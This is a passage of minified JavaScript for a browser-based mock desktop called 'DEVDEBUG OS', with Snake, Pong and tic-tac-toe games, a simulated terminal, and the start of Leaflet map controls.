(function(){const o=document.createElement("link").relList;if(o&&o.supports&&o.supports("modulepreload"))return;for(const s of document.querySelectorAll('link[rel="modulepreload"]'))t(s);new MutationObserver(s=>{for(const i of s)if(i.type==="childList")for(const p of i.addedNodes)p.tagName==="LINK"&&p.rel==="modulepreload"&&t(p)}).observe(document,{childList:!0,subtree:!0});function r(s){const i={};return s.integrity&&(i.integrity=s.integrity),s.referrerPolicy&&(i.referrerPolicy=s.referrerPolicy),s.crossOrigin==="use-credentials"?i.credentials="include":s.crossOrigin==="anonymous"?i.credentials="omit":i.credentials="same-origin",i}function t(s){if(s.ep)return;s.ep=!0;const i=r(s);fetch(s.href,i)}})();const F={SNAKE:{TILE_SIZE:20,INITIAL_POSITION:{x:10,y:10}},TENNIS:{WINNING_SCORE:5,FPS:60,BALL_RADIUS:8,INITIAL_BALL_SPEED:6}};function re(e,o){e.querySelector(".window-content").innerHTML=`
              <div class="flex flex-col h-full bg-black">
                  <!-- Enhanced Header -->
                  <div class="flex justify-between items-center p-3 flex-shrink-0" style="background-color: var(--primary-color-darker); border-bottom: 2px solid var(--primary-color);">
                      <div class="flex items-center space-x-4">
                          <div class="flex items-center space-x-2">
                              <i data-lucide="activity" class="w-4 h-4" style="color: var(--primary-color);"></i>
                              <span class="text-xs font-bold" style="color: var(--text-color-dim);">STATUS:</span>
                              <span id="game-status" class="text-sm font-bold px-2 py-1 rounded" style="color: var(--accent-color); background-color: rgba(0, 255, 255, 0.1);">READY</span>
                          </div>
                      </div>
                      <div class="flex items-center space-x-6">
                          <div class="flex items-center space-x-2">
                              <i data-lucide="trophy" class="w-4 h-4" style="color: var(--accent-color);"></i>
                              <span class="text-xs font-bold" style="color: var(--text-color-dim);">SCORE:</span>
                              <span id="snake-score" class="text-xl font-mono font-bold px-3 py-1 rounded" style="color: var(--accent-color); background-color: rgba(0, 255, 255, 0.1); min-width: 60px; text-align: center;">0</span>
                          </div>
                          <div class="flex items-center space-x-2">
                              <i data-lucide="star" class="w-4 h-4" style="color: var(--danger-color);"></i>
                              <span class="text-xs font-bold" style="color: var(--text-color-dim);">BEST:</span>
                              <span id="snake-high-score" class="text-sm font-mono font-bold px-2 py-1 rounded" style="color: var(--danger-color); background-color: rgba(255, 69, 0, 0.1);">0</span>
                          </div>
                      </div>
                  </div>

                  <!-- Game Canvas Container -->
                  <div id="snake-container" class="flex-grow flex items-center justify-center relative" style="background: #000;">
                      <canvas id="snake-canvas" width="420" height="420"></canvas>
                  </div>

                  <!-- Enhanced Footer with Controls -->
                  <div class="p-3 flex-shrink-0" style="background-color: var(--primary-color-darker); border-top: 2px solid var(--primary-color);">
                      <div class="flex items-center justify-between">
                          <div class="flex items-center space-x-4 text-xs" style="color: var(--text-color-dim);">
                              <div class="flex items-center space-x-1">
                                  <i data-lucide="arrow-up" class="w-3 h-3"></i>
                                  <i data-lucide="arrow-down" class="w-3 h-3"></i>
                                  <i data-lucide="arrow-left" class="w-3 h-3"></i>
                                  <i data-lucide="arrow-right" class="w-3 h-3"></i>
                                  <span class="ml-1">Move</span>
                              </div>
                              <div class="flex items-center space-x-1">
                                  <span class="px-1.5 py-0.5 rounded" style="background-color: var(--primary-color-dark);">SPACE</span>
                                  <span>Pause/Start</span>
                              </div>
                          </div>
                          <div class="text-xs" style="color: var(--text-color-dim); opacity: 0.7;">
                              Length: <span id="snake-length" class="font-bold" style="color: var(--primary-color);">3</span>
                          </div>
                      </div>
                  </div>
              </div>
          `;const r=e.querySelector("#snake-canvas"),t=r.getContext("2d"),s=e.querySelector("#snake-score"),i=e.querySelector("#game-status"),p=e.querySelector("#snake-high-score"),u=e.querySelector("#snake-length");lucide.createIcons({nodes:e.querySelectorAll("[data-lucide]")});let a=parseInt(localStorage.getItem("snakeHighScore")||"0",10);p.textContent=a;const n=F.SNAKE.TILE_SIZE,g=r.width/n,c=100;let d,v,m,f,h,l,k,b=null,x=0;const y=()=>{let C,_;do{_=!1,C={x:Math.floor(Math.random()*g),y:Math.floor(Math.random()*g)};for(const N of d)if(N.x===C.x&&N.y===C.y){_=!0;break}}while(_);v=C},S=(C,_,N,R=!1)=>{const P=C*n,$=_*n;t.fillStyle=N,t.fillRect(P,$,n,n),R&&(t.fillStyle="rgba(255, 255, 255, 0.3)",t.fillRect(P+1,$+1,n-2,n-2))},T=(C,_)=>{const N=C*n,R=_*n,P=1+Math.sin(x)*.5,$=n-P*2,X=getComputedStyle(document.documentElement).getPropertyValue("--danger-color").trim();t.shadowBlur=6,t.shadowColor=X,t.fillStyle=X,t.fillRect(N+P,R+P,$,$),t.shadowBlur=0,t.fillStyle="rgba(255, 255, 255, 0.6)",t.fillRect(N+P+1,R+P+1,$-2,$-2)},w=(C,_,N,R=!1)=>{t.fillStyle="rgba(0, 0, 0, 0.9)",t.fillRect(0,0,r.width,r.height),t.fillStyle=N,t.font="bold 32px Consolas, Monospace",t.textAlign="center",t.textBaseline="middle",t.shadowColor="rgba(0, 0, 0, 0.8)",t.shadowBlur=10,t.shadowOffsetX=2,t.shadowOffsetY=2,t.fillText(C,r.width/2,r.height/2-30),t.font="16px Consolas, Monospace",t.fillStyle="rgba(255, 255, 255, 0.8)",t.fillText(_,r.width/2,r.height/2+10),R&&(t.font="14px Consolas, Monospace",t.fillStyle="rgba(255, 255, 255, 0.6)",t.fillText("Press SPACE to restart",r.width/2,r.height/2+35)),t.shadowBlur=0},D=()=>{t.clearRect(0,0,r.width,r.height),t.strokeStyle="rgba(0, 255, 65, 0.3)",t.lineWidth=.5;for(let P=0;P<=g;P++)t.beginPath(),t.moveTo(P*n,0),t.lineTo(P*n,r.height),t.stroke(),t.beginPath(),t.moveTo(0,P*n),t.lineTo(r.width,P*n),t.stroke();const C=getComputedStyle(document.documentElement),_=C.getPropertyValue("--primary-color").trim(),N=C.getPropertyValue("--accent-color").trim(),R=C.getPropertyValue("--danger-color").trim();x+=.2,T(v.x,v.y),d.forEach((P,$)=>{const U=$===0,X=U?N:_;S(P.x,P.y,X,U)}),s.textContent=f,u.textContent=d.length,k?(i.textContent="PAUSED",i.style.backgroundColor="rgba(0, 255, 255, 0.2)",w("PAUSED","Press SPACE to resume.",N)):l?(i.textContent="GAME OVER",i.style.backgroundColor="rgba(255, 69, 0, 0.2)",b&&clearInterval(b),w("GAME OVER",`Final Score: ${f} | Length: ${d.length}`,R,!0)):(i.textContent="RUNNING",i.style.backgroundColor="rgba(0, 255, 65, 0.2)")},I=C=>{for(let _=1;_<d.length;_++)if(C.x===d[_].x&&C.y===d[_].y)return!0;return!1},M=()=>{if(h.length>0){const _=h.shift();(_.x!==-m.x||_.y!==-m.y)&&(m=_)}const C={x:d[0].x+m.x,y:d[0].y+m.y};if(C.x<0||C.x>=g||C.y<0||C.y>=g||I(C)){l=!0;return}d.unshift(C),C.x===v.x&&C.y===v.y?(f++,f>a&&(a=f,localStorage.setItem("snakeHighScore",a.toString()),p.textContent=a),y()):d.pop()},A=()=>{f>a&&(a=f,localStorage.setItem("snakeHighScore",a.toString()),p.textContent=a);const C=F.SNAKE.INITIAL_POSITION;d=[{x:C.x,y:C.y},{x:C.x-1,y:C.y},{x:C.x-2,y:C.y}],m={x:1,y:0},f=0,l=!1,h=[],k=!0,x=0,s.textContent="0",u.textContent="3",i.textContent="READY",i.style.backgroundColor="rgba(0, 255, 65, 0.1)",y(),D()},H=()=>{!k&&!l?(M(),D()):l&&(i.textContent="GAME OVER",b&&clearInterval(b),D())},B=()=>{b&&clearInterval(b),b=setInterval(H,c)},O=C=>{if(parseInt(e.style.zIndex)===o.nextZIndex){if(C.key===" "||C.key==="Spacebar"){if(C.preventDefault(),l){f>a&&(a=f,localStorage.setItem("snakeHighScore",a.toString()),p.textContent=a),A(),k=!1,B();return}k=!k,k?b&&clearInterval(b):(B(),i.textContent="RUNNING"),D();return}if(!(k||l))switch(C.key){case"ArrowLeft":case"a":h.push({x:-1,y:0});break;case"ArrowUp":case"w":h.push({x:0,y:-1});break;case"ArrowRight":case"d":h.push({x:1,y:0});break;case"ArrowDown":case"s":h.push({x:0,y:1});break}}};document.addEventListener("keydown",O),e.cleanup=()=>{document.removeEventListener("keydown",O),b&&clearInterval(b)},A();const E=getComputedStyle(document.documentElement).getPropertyValue("--primary-color").trim();w("PRESS SPACE TO START","Use Arrow Keys or WASD to move",E)}function se(e,o){e.querySelector(".window-content").innerHTML=`
              <div class="flex flex-col h-full bg-black">
                  <!-- Minimal Header -->
                  <div class="flex justify-center items-center p-2" style="background-color: var(--primary-color-darker); border-bottom: 1px solid var(--primary-color-dark);">
                      <span id="player-score" class="text-2xl font-mono font-bold px-4" style="color: var(--accent-color);">0</span>
                      <span class="text-xl px-2" style="color: var(--primary-color);">|</span>
                      <span id="cpu-score" class="text-2xl font-mono font-bold px-4" style="color: var(--danger-color);">0</span>
                  </div>

                  <!-- Game Canvas -->
                  <div id="tennis-container" class="flex-grow flex items-center justify-center relative bg-black">
                      <canvas id="pong-canvas" class="cursor-none"></canvas>
                      <!-- Start Screen -->
                      <div id="tennis-start-screen" class="absolute inset-0 flex items-center justify-center bg-black bg-opacity-90" style="color: var(--text-color-dim); border: 1px solid var(--primary-color-dark);">
                          <div class="text-center">
                              <div class="text-2xl font-bold mb-4" style="color: var(--primary-color);">TERMINAL TENNIS</div>
                              <div class="text-sm mb-4">First to 5 points wins</div>
                              <div class="text-xs mb-4">
                                  <div>SPACE: Start/Pause Game</div>
                                  <div>MOUSE: Move Your Paddle</div>
                              </div>
                              <div class="text-lg font-mono" style="color: var(--accent-color);">PRESS SPACE TO START</div>
                          </div>
                      </div>
                  </div>

              </div>
          `;const r=e.querySelector("#pong-canvas"),t=r.getContext("2d"),s=e.querySelector("#player-score"),i=e.querySelector("#cpu-score"),p=e.querySelector("#tennis-start-screen");let u=null,a=!1,n=!0;const g=F.TENNIS.WINNING_SCORE;let c,d,v,m;const f=(E,C,_,N,R)=>{t.fillStyle=R,t.fillRect(E,C,_,N)},h=(E,C,_,N)=>{t.fillStyle=N,t.beginPath(),t.arc(E,C,_,0,Math.PI*2,!1),t.closePath(),t.fill()},l=E=>{for(let C=0;C<=r.height;C+=25)t.fillStyle=E,t.fillRect(m.x,m.y+C,m.width,m.height)},k=()=>{c={x:r.width/2,y:r.height/2,radius:F.TENNIS.BALL_RADIUS,speed:F.TENNIS.INITIAL_BALL_SPEED,velX:F.TENNIS.INITIAL_BALL_SPEED,velY:F.TENNIS.INITIAL_BALL_SPEED},d={x:10,y:(r.height-80)/2,width:10,height:80,score:0},v={x:r.width-20,y:(r.height-80)/2,width:10,height:80,score:0,maxSpeed:5},m={x:(r.width-4)/2,y:0,width:4,height:15}},b=()=>{if(!c)return;c.x=r.width/2,c.y=Math.random()*(r.height-100)+50,c.speed=F.TENNIS.INITIAL_BALL_SPEED;let E=c.velX!==void 0&&c.velX>0?-1:1;c.velX=E*c.speed,c.velY=(Math.random()>.5?1:-1)*(Math.random()*4+2)},x=()=>{!d||!v||!c||(d.score=0,v.score=0,a=!1,n=!0,b(),s.textContent="0",i.textContent="0")},y=()=>{const E=r.parentElement;r.width=E.clientWidth,r.height=E.clientHeight,!c||!d||!v||!m?k():(d.y=(r.height-d.height)/2,v.x=r.width-v.width-10,v.y=(r.height-v.height)/2,m.x=(r.width-m.width)/2,c&&b())},S=(E,C)=>E.x+E.radius>C.x&&E.x-E.radius<C.x+C.width&&E.y+E.radius>C.y&&E.y-E.radius<C.y+C.height,T=()=>{if(a||!c||!d||!v)return;c.x+=c.velX,c.y+=c.velY;let C=(c.y-(v.y+v.height/2))*.1;if(Math.abs(C)>v.maxSpeed&&(C=v.maxSpeed*Math.sign(C)),v.y+=C,v.y<0&&(v.y=0),v.y>r.height-v.height&&(v.y=r.height-v.height),(c.y+c.radius>r.height||c.y-c.radius<0)&&(c.velY=-c.velY,c.y-c.radius<0&&(c.y=c.radius),c.y+c.radius>r.height&&(c.y=r.height-c.radius)),S(c,d)){let _=(c.y-(d.y+d.height/2))/(d.height/2),N=Math.PI/4*_;c.velX=Math.abs(c.velX),c.velY=c.speed*Math.sin(N),c.speed=Math.min(c.speed+.3,15),c.x=d.x+d.width+c.radius}else if(S(c,v)){let _=(c.y-(v.y+v.height/2))/(v.height/2),N=Math.PI/4*_;c.velX=-Math.abs(c.velX),c.velY=c.speed*Math.sin(N),c.speed=Math.min(c.speed+.3,15),c.x=v.x-c.radius}c.x-c.radius<0?(v.score++,i.textContent=v.score,b()):c.x+c.radius>r.width&&(d.score++,s.textContent=d.score,b())},w=(E,C,_)=>{t.fillStyle="rgba(0, 0, 0, 0.85)",t.fillRect(0,0,r.width,r.height),t.fillStyle=_,t.font="bold 32px Consolas, Monospace",t.textAlign="center",t.textBaseline="middle",t.fillText(E,r.width/2,r.height/2-20),t.font="16px Consolas, Monospace",t.fillStyle="rgba(255, 255, 255, 0.7)",t.fillText(C,r.width/2,r.height/2+20)},D=()=>{if(!c||!d||!v||!m)return;const E=getComputedStyle(document.documentElement),C=E.getPropertyValue("--primary-color").trim(),_=E.getPropertyValue("--accent-color").trim(),N=E.getPropertyValue("--danger-color").trim();if(t.fillStyle="#000000",t.fillRect(0,0,r.width,r.height),l(C),f(d.x,d.y,d.width,d.height,_),f(v.x,v.y,v.width,v.height,N),h(c.x,c.y,c.radius,C),!a&&(d.score>=g||v.score>=g)){a=!0,n=!0;const R=d.score>=g;w(R?"YOU WIN":"CPU WINS","Press SPACE to restart",R?_:N),r.classList.remove("cursor-none"),u&&clearInterval(u),u=null}p.style.display=n&&!a?"flex":"none"},I=()=>{!n&&!a&&T(),D()},M=E=>{if(!d||a)return;let C=r.getBoundingClientRect();d.y=E.clientY-C.top-d.height/2,d.y<0&&(d.y=0),d.y>r.height-d.height&&(d.y=r.height-d.height)},A=E=>{parseInt(e.style.zIndex)===o.nextZIndex&&(E.key===" "||E.key==="Spacebar")&&(E.preventDefault(),a?(x(),n=!1,r.classList.add("cursor-none"),u=setInterval(I,1e3/F.TENNIS.FPS)):(n=!n,n?(u&&clearInterval(u),u=null):u=setInterval(I,1e3/F.TENNIS.FPS),D()))},H=()=>{a&&(x(),n=!1,r.classList.add("cursor-none"),u=setInterval(I,1e3/F.TENNIS.FPS))},B=new ResizeObserver(()=>{y()});B.observe(r.parentElement),y();const O=getComputedStyle(document.documentElement).getPropertyValue("--primary-color").trim();w("PRESS SPACE TO START","Use mouse to move paddle",O),I(),e.addEventListener("mousemove",M),r.addEventListener("click",H),document.addEventListener("keydown",A),e.cleanup=()=>{B.disconnect(),r.removeEventListener("click",H),document.removeEventListener("keydown",A),u&&clearInterval(u),e.removeEventListener("mousemove",M)}}function ae(e){e.querySelector(".window-content").innerHTML=`
       <div class="flex flex-col h-full bg-black">
           <!-- Header -->
           <div class="flex justify-center items-center p-3 flex-shrink-0" style="background-color: var(--primary-color-darker); border-bottom: 2px solid var(--primary-color);">
               <div class="flex items-center space-x-4">
                   <div class="flex items-center space-x-2">
                       <i data-lucide="grid-3x3" class="w-4 h-4" style="color: var(--primary-color);"></i>
                       <span class="text-xs font-bold" style="color: var(--text-color-dim);">STATUS:</span>
                       <span id="tictactoe-status" class="text-sm font-bold px-2 py-1 rounded" style="color: var(--accent-color); background-color: rgba(0, 255, 255, 0.1);">Your Turn</span>
                   </div>
               </div>
           </div>

           <!-- Game Board -->
           <div class="flex-grow flex items-center justify-center p-4">
               <div id="tictactoe-board" class="grid grid-cols-3 gap-2 w-64 h-64">
                   <!-- Cells will be generated here -->
               </div>
           </div>

           <!-- Footer -->
           <div class="p-3 flex-shrink-0 flex justify-center" style="background-color: var(--primary-color-darker); border-top: 2px solid var(--primary-color);">
               <button id="tictactoe-reset" class="px-4 py-2 text-sm font-bold" style="background-color: var(--primary-color); color: black; border: 1px solid var(--primary-color);">New Game</button>
           </div>
       </div>
   `;const o=e.querySelector("#tictactoe-status"),r=e.querySelector("#tictactoe-board"),t=e.querySelector("#tictactoe-reset");lucide.createIcons({nodes:e.querySelectorAll("[data-lucide]")});let s=Array(9).fill(null),i="X",p=!1;for(let d=0;d<9;d++){const v=document.createElement("div");v.className="flex items-center justify-center text-4xl font-bold cursor-pointer border-2 transition-colors",v.style.borderColor="var(--primary-color-dark)",v.style.color="var(--primary-color)",v.style.width="80px",v.style.height="80px",v.style.overflow="hidden",v.dataset.index=d,v.addEventListener("click",()=>a(d)),r.appendChild(v)}const u=r.querySelectorAll("div");function a(d){if(!(s[d]||p||i!=="X")){if(s[d]="X",u[d].textContent="X",u[d].style.color="var(--accent-color)",g()){o.textContent="You Win!",o.style.backgroundColor="rgba(0, 255, 65, 0.2)",p=!0;return}if(s.every(v=>v)){o.textContent="Draw!",o.style.backgroundColor="rgba(255, 255, 255, 0.2)",p=!0;return}i="O",o.textContent="Computer's Turn",o.style.backgroundColor="rgba(255, 69, 0, 0.2)",setTimeout(n,500)}}function n(){if(p)return;const d=s.map((m,f)=>m===null?f:null).filter(m=>m!==null);if(d.length===0)return;const v=d[Math.floor(Math.random()*d.length)];if(s[v]="O",u[v].textContent="O",u[v].style.color="var(--danger-color)",g()){o.textContent="Computer Wins!",o.style.backgroundColor="rgba(255, 69, 0, 0.2)",p=!0;return}if(s.every(m=>m)){o.textContent="Draw!",o.style.backgroundColor="rgba(255, 255, 255, 0.2)",p=!0;return}i="X",o.textContent="Your Turn",o.style.backgroundColor="rgba(0, 255, 255, 0.1)"}function g(){const d=[[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];for(const v of d){const[m,f,h]=v;if(s[m]&&s[m]===s[f]&&s[m]===s[h])return u[m].style.backgroundColor="rgba(255, 255, 255, 0.2)",u[f].style.backgroundColor="rgba(255, 255, 255, 0.2)",u[h].style.backgroundColor="rgba(255, 255, 255, 0.2)",!0}return!1}function c(){s=Array(9).fill(null),i="X",p=!1,o.textContent="Your Turn",o.style.backgroundColor="rgba(0, 255, 255, 0.1)",u.forEach(d=>{d.textContent="",d.style.backgroundColor="transparent"})}t.addEventListener("click",c),c()}function ne(e,o){const{fileSystem:r,WindowManager:t,apps:s,openApp:i,closeApp:p}=o;e.querySelector(".window-content").innerHTML=`
              <div id="terminal-output" class="p-2 h-full overflow-y-auto text-sm font-mono whitespace-pre-wrap"></div>
              <div class="flex items-center p-1 flex-shrink-0" style="background-color: var(--primary-color-darker); border-top: 1px solid var(--primary-color-dark);">
                  <span class="pl-2" style="color: var(--primary-color); font-family: 'Consolas', 'Monospace', monospace;">devdebug@os:~$</span>
                  <input type="text" id="terminal-input" class="flex-grow p-1 bg-transparent focus:outline-none text-sm" style="color: var(--primary-color);" autocomplete="off" />
              </div>
          `;const u=e.querySelector("#terminal-output"),a=e.querySelector("#terminal-input");let n=[],g=-1,c="/";const d=(l,k=!1)=>{k?u.innerHTML+=`<span style="color: var(--primary-color);">devdebug@os:~$</span> <span style="color: var(--text-color-dim);">${l}</span>
`:u.innerHTML+=l+`
`,u.scrollTop=u.scrollHeight},v=(l,k)=>{l.startsWith("/")||(l=(k==="/"?"":k)+"/"+l);const b=l.split("/").filter(y=>y);let x=r.root;for(const y of b){if(y===".."){const S=l.substring(0,l.lastIndexOf("/"))||"/";return v(S,"/")}if(x&&x.type==="folder"&&x.children[y])x=x.children[y];else return null}return x},m={help:()=>`Available commands:
  <span style="color: var(--accent-color);">help</span>         - Shows this help message.
  <span style="color: var(--accent-color);">ls</span>           - Lists items on the desktop.
  <span style="color: var(--accent-color);">ps</span>           - Lists active processes.
  <span style="color: var(--accent-color);">open [app_id]</span>  - Opens an application (e.g., 'open browser').
  <span style="color: var(--accent-color);">kill [app_id]</span>  - Terminates a running application (e.g., 'kill browser').
  <span style="color: var(--accent-color);">clear</span>        - Clears the terminal screen.
  <span style="color: var(--accent-color);">echo [text]</span>    - Prints text to the terminal.
  <span style="color: var(--accent-color);">date</span>         - Displays the current date and time.
  <span style="color: var(--accent-color);">neofetch</span>     - Shows system information.
  <span style="color: var(--accent-color);">devdebug</span>     - Displays the OS logo.
  <span style="color: var(--accent-color);">matrix</span>       - Enter the matrix.`,ls:l=>{let k=l[0]||".";const b=k==="."?v(c,"/"):v(k,c);if(!b||b.type!=="folder")return`ls: cannot access '${k}': No such file or directory`;const x=Object.keys(b.children);return x.length===0?"":x.map(y=>`<span style="color: ${b.children[y].type==="folder"?"var(--accent-color)":"var(--primary-color)"};">${y}</span>`).join(`
`)},cd:l=>{const k=l[0]||"/",b=v(k,c);if(!b||b.type!=="folder")return`cd: no such file or directory: ${k}`;let x=(c==="/"?"":c)+"/"+k;return k.startsWith("/")&&(x=k),x=x.replace(/\/[^/]+\/\.\./g,"")||"/",c=x,e.querySelector(".flex-shrink-0 > span").textContent=`devdebug@os:~${c}$`,""},cat:l=>{const k=l[0];if(!k)return"Usage: cat [file_path]";const b=v(k,c);return!b||b.type!=="file"?`cat: ${k}: No such file or directory`:b.content},ps:()=>{let l=`<span style="color: var(--text-color-dim);">PROCESS						CPU		MEM</span>
`;l+=`----------------------------------------------
`;const k=Object.keys(t.openWindows);return k.length===0?"No active processes.":(k.forEach(b=>{const x=(Math.random()*(b==="snake"||b==="terminal-tennis"?15:5)).toFixed(2).padStart(6," "),y=(Math.random()*100+50).toFixed(1).padStart(6," ");l+=`${b.padEnd(24," ")}${x}%	${y}MB
`}),l)},open:l=>{const k=l[0];return k?s[k]?(i(k),`Executing: ${k}...`):`Error: Application '${k}' not found.`:"Usage: open [app_id]"},kill:l=>{const k=l[0];return k?k==="terminal"?"Error: Cannot terminate the terminal from within itself.":t.openWindows[k]?(p(k),`Process '${k}' terminated.`):`Error: Process '${k}' not found or not running.`:"Usage: kill [app_id]"},clear:()=>(u.innerHTML="",""),echo:l=>`<span style="color: var(--accent-color);"> &lt; ${l.join(" ")||"..."} &gt;</span>
`+`   \\  
  \\  
    |\\__/,|   (\`\\
    |_ _  |.--.) )
    ( T   )     /
  (((^_(((/(((_/                
                   `,date:()=>new Date().toLocaleString(),neofetch:()=>`
<span style="color: var(--text-color-dim);">devdebug@os</span>
-------------------
<span style="color: var(--text-color-dim);">OS:</span> DEVDEBUG OS v1.0
<span style="color: var(--text-color-dim);">Kernel:</span> 5.4.0-generic-js
<span style="color: var(--text-color-dim);">Uptime:</span> ${new Date(new Date-window.osStartTime).toISOString().substr(11,8)}
<span style="color: var(--text-color-dim);">Shell:</span> term.js
<span style="color: var(--text-color-dim);">Resolution:</span> ${window.innerWidth}x${window.innerHeight}
<span style="color: var(--text-color-dim);">Theme:</span> [Current]
<span style="color: var(--text-color-dim);">CPU:</span> Ryzen 5 (Simulated)
<span style="color: var(--text-color-dim);">GPU:</span> NVIDIA RTX 5060 Ti (Sim)`,devdebug:()=>`<pre style="line-height: 1.2;">

                  
██████╗ ███████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗   ██╗ ██████╗  
██╔══██╗██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝  
██║  ██║█████╗  ██║   ██║██║  ██║█████╗  ██████╔╝██║   ██║██║  ███╗ 
██║  ██║██╔══╝  ╚██╗ ██╔╝██║  ██║██╔══╝  ██╔══██╗██║   ██║██║   ██║ 
██████╔╝███████╗ ╚████╔╝ ██████╔╝███████╗██████╔╝╚██████╔╝╚██████╔╝ 
╚═════╝ ╚══════╝  ╚═══╝  ╚═════╝ ╚══════╝╚═════╝  ╚═════╝  ╚═════╝  
------------------------------------ Made with ♥ by Debmalya Mondal           
                  
                  </pre>`,matrix:()=>"INITIALIZING MATRIX..."},f=l=>{d(l,!0),n.unshift(l),g=-1;const k=l.trim().split(/\s+/),b=k[0].toLowerCase(),x=k.slice(1);if(b==="matrix"){h(x);return}if(m[b]){const y=m[b](x);y&&d(y)}else b&&d(`Command not found: ${b}. Type 'help' for a list of commands.`)},h=l=>{const k=e.querySelector(".flex-shrink-0");k.style.display="none";const b=document.createElement("canvas"),x=b.getContext("2d");b.width=u.clientWidth,b.height=u.clientHeight;const y=getComputedStyle(document.documentElement).getPropertyValue("--primary-color").trim(),S="rgba(0, 0, 0, 0.05)",T=16,w=b.width/T,D={mixed:"アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホমোয়ো্যোয়ো গোজো দোবো পো পো ভুতুন 0123456789",english:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()",bengali:"অআইঈউঊঋঌএঐওঔকখগঘঙচছজঝঞটঠডঢণতথদধনপফবভমযরলশষসহংঃঽািীুূৃৄেৈোৌ্ৎ"};let I;const M=l[0]?l[0].toLowerCase():"mixed";M==="e"||M==="english"?I=D.english:M==="b"||M==="bengali"?I=D.bengali:I=D.mixed;const A=[];for(let E=0;E<w;E++)A[E]=1;let H;function B(){x.fillStyle=S,x.fillRect(0,0,b.width,b.height),x.fillStyle=y,x.font=`${T}px monospace`;for(let E=0;E<A.length;E++){const C=I[Math.floor(Math.random()*I.length)];x.fillText(C,E*T,A[E]*T),A[E]*T>b.height&&Math.random()>.975&&(A[E]=0),A[E]++}H=requestAnimationFrame(B)}const O=()=>{cancelAnimationFrame(H),b.remove(),k.style.display="flex",d("Matrix sequence terminated."),a.focus(),document.removeEventListener("keydown",O),e.removeEventListener("click",O)};document.addEventListener("keydown",O,{once:!0}),e.addEventListener("click",O,{once:!0}),d("Entering the Matrix... Press any key or click to exit."),setTimeout(()=>{u.innerHTML="",u.appendChild(b),B()},1e3)};a.addEventListener("keydown",l=>{l.key==="Enter"?(f(a.value),a.value=""):l.key==="ArrowUp"?g<n.length-1&&(g++,a.value=n[g]):l.key==="ArrowDown"&&(g>0?(g--,a.value=n[g]):(g=-1,a.value=""))}),e.addEventListener("click",()=>a.focus()),a.focus(),d(`DEVDEBUG OS [Isolated Environment]
(c) DevDebug Corporation. All rights reserved.

Type 'help' for a list of available commands.`)}function ie(e,o){const{API_CONFIG:r,ANIMATION_CONSTANTS:t}=o;if(L.Control.Coordinates=L.Control.extend({onAdd:function(h){const l=L.DomUtil.create("div","leaflet-control-coordinates");return l.innerHTML="Lat: 0.00000, Lon: 0.00000",h.on("mousemove",k=>{const b=k.latlng.wrap(),x=b.lat.toFixed(5),y=b.lng.toFixed(5);l.innerHTML=`Lat: ${x}, Lon: ${y}`}),h.on("mouseout",()=>{l.innerHTML="---"}),l},onRemove:function(h){h.off("mousemove"),h.off("mouseout")}}),L.Control.SelectLayers=L.Control.extend({onAdd:function(h){const l=L.DomUtil.create("div","leaflet-control-select-layers leaflet-bar"),k=L.DomUtil.create("select","",l);for(const b in this.options.baseLayers){const x=L.DomUtil.create("option","",k);x.value=b,x.innerHTML=b,h.hasLayer(this.options.baseLayers[b])&&(k.value=b)}return L.DomEvent.on(k,"change",()=>{const b=k.value;for(const x in this.options.baseLayers)h.hasLayer(this.options.baseLayers[x])&&h.removeLayer(this.options.baseLayers[x]);h.addLayer(this.options.baseLayers[b])}),L.DomEvent.on(l,"click",L.DomEvent.stopPropagation),L.DomEvent.on(l,"mousedown",L.DomEvent.stopPropagation),l},onRemove:function(h){}}),L.Control.LatLonSearch=L.Control.extend({onAdd:function(h){const l=L.DomUtil.create("div","leaflet-control-latlon-search");l.innerHTML=`
                <div class="latlon-container">
                    <div class="input-group">
                        <span>Latitude</span>
                        <input type="text" id="lat-input" placeholder="e.g. 28.6139" title="Latitude (-90 to 90)">
                    </div>
                    <div class="input-group">
                        <span>Longitude</span>
                        <input type="text" id="lon-input" placeholder="e.g. 77.2090" title="Longitude (-180 to 180)">
                    </div>
                    <button id="coord-search-btn" title="Search Coordinates">
                        <i data-lucide="search"></i>
                    </button>
                </div>
            `;const k=l.querySelector("#lat-input"),b=l.querySelector("#lon-input"),x=l.querySelector("#coord-search-btn"),y=()=>{const S=k.value.trim(),T=b.value.trim();if(!S||!T)return;const w=parseFloat(S),D=parseFloat(T);if(!isNaN(w)&&!isNaN(D)&&w>=-90&&w<=90&&D>=-180&&D<=180){const I=L.latLng(w,D);h.setView(I,13,{animate:!0}),f(I)}else alert(`Invalid coordinates.
Latitude: -90 to 90
Longitude: -180 to 180`)};return L.DomEvent.on(x,"click",S=>{L.DomEvent.stopPropagation(S),y()}),L.DomEvent.on(k,"keydown",S=>{S.key==="Enter"&&y()}),L.DomEvent.on(b,"keydown",S=>{S.key==="Enter"&&y()}),L.DomEvent.disableClickPropagation(l),setTimeout(()=>{window.lucide&&lucide.createIcons({nodes:l.querySelectorAll("[data-lucide]")})},100),l},onRemove:function(h){}}),L.Control.SearchToggle=L.Control.extend({onAdd:function(h){this._mode=null;const l=L.DomUtil.create("div","leaflet-control-search-toggle");l.innerHTML=`
                <div class="search-toggle-btn" id="toggle-address" title="Address Search">
                    <i data-lucide="search"></i>
                </div>
                <div class="search-toggle-btn" id="toggle-coords" title="Coordinate Search">
                    <i data-lucide="compass"></i>
                </div>
